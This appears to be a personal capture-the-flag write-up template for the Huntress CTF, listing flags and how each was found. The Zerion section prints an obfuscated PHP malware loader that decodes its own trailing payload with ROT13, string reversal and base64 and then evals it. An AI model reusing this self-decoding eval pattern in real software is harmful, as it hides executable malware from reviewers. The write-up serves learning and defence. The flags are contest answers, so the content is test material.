---
creation date: September 29th 2023
last modified date: September 29th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[Huntress CTF]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- 

---

# Information Gathering
Scanned all TCP ports:
```bash

```

Enumerated open TCP ports:
```bash

```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 


---

# Exploitation
## Name of the technique


---

# Lateral Movement to user
## Local Enumeration


## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Trophy & Loot

## Flags
### Read The Rules
```
flag{90bc54705794a62015369fd8e86e557b}
```
- Found in Game Rules comments in HTML Elements

### Notepad
```
flag{2dd41e3da37ef1238954d8e7f3217cd8}
```
- Downloaded file and read it with cat `cat notepad`

### Technical Support
```
flag{a98373a74abb8c5ebb8f5192e034a91c}
```
- Check discord `ctf-open-ticket` channel

### String Cheese
```
flag{f4d9f0f70bf353f2ca23d81dcf7c9099}
```
- Downloaded .jpeg and used `strings cheese.jpg | grep flag*` command to locate it

### Query Code
```
flag{3434cf5dc6a865657ea1ec1cb675ce3b}
```
- Downloaded file and its a PNG file type just not marked with .PNG
	- File is a QR code I used [[CyberChef]] to open it but you can use anything that can read QR codes and its a direct translation for the flag

### Zerion
```
flag{af10370d485952897d5183aa09e19883}
```
1. Downloaded obfuscated malware
2. Using sublime I started to break it down line by line
```php
<?php 
$L66Rgr=explode("?>",file_get_contents(__FILE__));
$L6CRgr=array("/x/i","x",base64_decode(strrev(str_rot13($L66Rgr[1]))));
$L7CRgr = "d6d666e70e43a3aeaec1be01341d9f9d";
preg_replace($L6CRgr[0],serialize(eval($L6CRgr[2])),$L6CRgr[1]);
exit();
?>
```
- Here I decoded a few lines that were set to use `base64_decode` to make it more readable
- Also separated each line based on `;` breaks in the code
3. After doing this I found that it starts by grabbing the contents of the current php file indicated with `__FILE__`
	- Under this code snippet is what seems to be the obfuscated code so assuming that is what this variable is grabbing
4. Next line is an `array` that shows its grabbing the variable we looked at in step 3
5. After it grabs it decodes it with `ROT13` followed by `strrev` which basically reverses the text lastly it decodes that all with `base64` so lets do that
6. I used [[CyberChef]] copied the rest of the file excluding the snippet I already looked over
	1. Add into the following in this order
		1. ROT 13
		2. Reverse
		3. From Base64
7. If it works you should see a large text file of php code
8. To finish it up I just used the search function to locate the flag looks like the hide it as a php variable in the website
```
https://c.-oiv3-.com/?flag=[FLAG IS HERE]
```

### Book By Its Cover
```
flag{f8d32a346745a6c4bf4e9504ba5308f0}
```
- Downloaded `book.rar` from CTF site
- Inspected with `file` command and found that its a `png`
- Changed file name with `mv book.rar book.png` and opened that flag was written on the image








___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 29th 2023 (11:38 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
